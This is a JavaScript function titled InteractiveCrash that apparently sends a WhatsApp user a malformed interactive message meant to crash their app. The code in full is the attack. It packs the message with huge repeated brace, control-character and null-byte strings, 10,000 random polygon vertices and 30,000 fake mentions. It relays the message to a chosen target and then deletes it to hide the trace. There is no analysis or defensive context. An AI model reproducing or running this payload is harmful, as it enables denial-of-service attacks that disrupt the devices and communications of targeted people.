async function InteractiveCrash(target) {
  try {
    const Msg = await generateWAMessageFromContent(
      target,
      {
        message: {
          interactiveMessage: {
            text: "Erlangga Offcial",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            name: "menu_option",
            paramsJson: "{{{".repeat(9999) + "\u0007\u0007".repeat(25555) + "".repeat(2555)
          },
          contextInfo: {
            stanzaId: "Laurine-BD32C2474B38",
            participant: target,
            annotations: [
              {
                polygonVertices: Array.from({ length: 10000 }, () => ({
                  x: Math.random() * 999999,
                  y: Math.random() * 999999
                })),
                newsletter: {
                  newsletterJid: "120363301416835342@newsletter",
                  newsletterName: "Erlangga Official Kill You !!!",
                  contentType: "UPDATE",
                  accessibilityText: "\u0000".repeat(10000)
                }
              }
            ],
            quotedMessage: {
              buttonMessage: {
                text: "ꦾ".repeat(25555),
                imageMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c&mms3=true",
                  mimetype: "image/jpeg",
                  caption: "\u0000\u0000".repeat(20000),
                  fileSha256: "lkP8hsY4ex+lzJw1ylVMCT/Ofl2Ouk7vTzjwKliA5fI=",
                  fileLength: 73247,
                  height: 736,
                  width: 736,
                  mediaKey: "X+ED0aJJfYyCud4vJNgwUUdMQy1zMJ7hHAsFUIUgt1w=",
                  fileEncSha256: "5xn7hRt0IR3v3pc54sbg8bemzYbE3FTHoK4rbWWE4Jk=",
                  directPath: "/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c",
                  jpegThumbnail: null
                },
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ]
              }
            }
          }
        }
      }
    );

    await langgxyz.relayMessage(target, Msg.message, {
      messageId: undefined
    });

    await delay(3000);

    await langgxyz.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: Msg.key?.id,
        participant: target
      }
    });

  } catch (err) {
    console.error('❌ Gagal menjalankan InteractiveCrash:', err);
  }
}